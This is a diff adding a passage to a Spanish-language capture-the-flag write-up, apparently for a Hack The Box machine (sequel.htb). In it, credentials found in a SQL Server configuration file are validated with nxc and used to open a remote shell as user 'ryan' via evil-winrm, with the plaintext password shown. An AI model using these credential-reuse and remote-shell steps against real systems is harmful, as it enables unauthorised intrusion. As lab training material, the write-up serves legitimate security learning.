@@ -594,3 +594,46 @@ PS C:\Windows\system32> whoami
 sequel\sql_svc
 
 PS C:\Windows\system32>
+```
+## SA -> Ryan
+
+Dentro de la raíz hay un directorio interesante **SQL2019**
+
+```bash
+PS C:\> dir
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        11/5/2022  12:03 PM                PerfLogs                                                              
+d-r---         1/4/2025   7:11 AM                Program Files                                                         
+d-----         6/9/2024   8:37 AM                Program Files (x86)                                                   
+d-----         6/8/2024   3:07 PM                SQL2019                                                               
+d-r---         6/9/2024   6:42 AM                Users                                                                 
+d-----         1/4/2025   8:10 AM                Windows    
+```
+Dentro de el en el archivo de configuración encontré credenciales que fueron validas para el usuario ryan
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# nxc winrm 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
+                                                                                                                                                             
+┌──(root㉿kali)-[/opt/chuleta]
+└─# evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
+sequel\ryan
+*Evil-WinRM* PS C:\Users\ryan\Documents> 
+```
